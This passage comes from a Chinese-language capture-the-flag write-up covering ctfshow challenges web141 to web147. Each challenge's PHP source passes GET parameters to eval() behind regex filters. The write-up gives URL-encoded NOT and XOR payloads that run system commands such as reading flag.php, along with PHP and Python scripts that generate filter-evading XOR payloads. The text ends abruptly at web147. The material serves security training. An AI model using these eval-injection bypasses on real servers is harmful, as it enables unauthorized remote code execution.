class="hljs-string">&quot;)(~&quot;</span>.<span class="hljs-variable">$d</span>.<span class="hljs-string">&quot;);&quot;</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);<br></code></pre></td></tr></table></figure><p>个人解惑：通过加上 <code>-</code> 号，可以构造出一个合法的数学或逻辑运算符，使得最终的表达式可以被 <code>eval()</code> 正常解析和执行。以前写的没有遇到加<code>-</code>的</p><h2 id="web142"><a class="markdownIt-Anchor" href="#web142"></a> web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-17 19:36:02</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>相当于睡眠下面的式子，可以输入v1=0可以变为0,下面的式子</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo>=</mo><mo stretchy="false">(</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>v</mi><mn>1</mn><mo>×</mo><mn>87</mn><msup><mn>7</mn><mn>5</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d=(int)(v1×877^5)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mord">7</span><span class="mord"><span class="mord">7</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0<br></code></pre></td></tr></table></figure><h2 id="web143"><a class="markdownIt-Anchor" href="#web143"></a> web143</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 12:48:14</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>多加了<code>+</code>,<code>-</code>,<code>~</code>不可以用取反了，可以尝试进行异或绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=*(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%0c&quot;</span>^<span class="hljs-string">&quot;%60%7f&quot;</span>)*<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=*(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;</span>^<span class="hljs-string">&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;</span>)*<br></code></pre></td></tr></table></figure><p>脚本是使用yu师傅的rce生成，然后用python进行构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><br>fun=<span class="hljs-string">&quot;system&quot;</span><br>cmd=<span class="hljs-string">&quot;tac flag.php&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;function:&quot;</span>+action(fun))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmd:&quot;</span>+action(cmd))<br><br></code></pre></td></tr></table></figure><h2 id="web144"><a class="markdownIt-Anchor" href="#web144"></a> web144</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 16:21:15</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$v3</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)===<span class="hljs-number">1</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>和web141基本一致，限制的是v2稍加进行修改即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v3=-&amp;v2=(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);<br></code></pre></td></tr></table></figure><h2 id="web145"><a class="markdownIt-Anchor" href="#web145"></a> web145</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 17:41:33</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x01-18"><a class="markdownIt-Anchor" href="#0x01-18"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F):<br></code></pre></td></tr></table></figure><h3 id="0x02-18"><a class="markdownIt-Anchor" href="#0x02-18"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|<br></code></pre></td></tr></table></figure><h2 id="web146"><a class="markdownIt-Anchor" href="#web146"></a> web146</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-18 17:41:33</span><br><br>*/<br><br><br>highlight_file(__FILE__);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$v1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                die(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;return $v1$v3<span class="hljs-variable">$v2</span>;&quot;</span>);<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$v1$v3<span class="hljs-variable">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用上一题的0x02的payload可以正常得到答案</p><h2 id="web147"><a class="markdownIt-Anchor" href="#web147"></a> web147</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 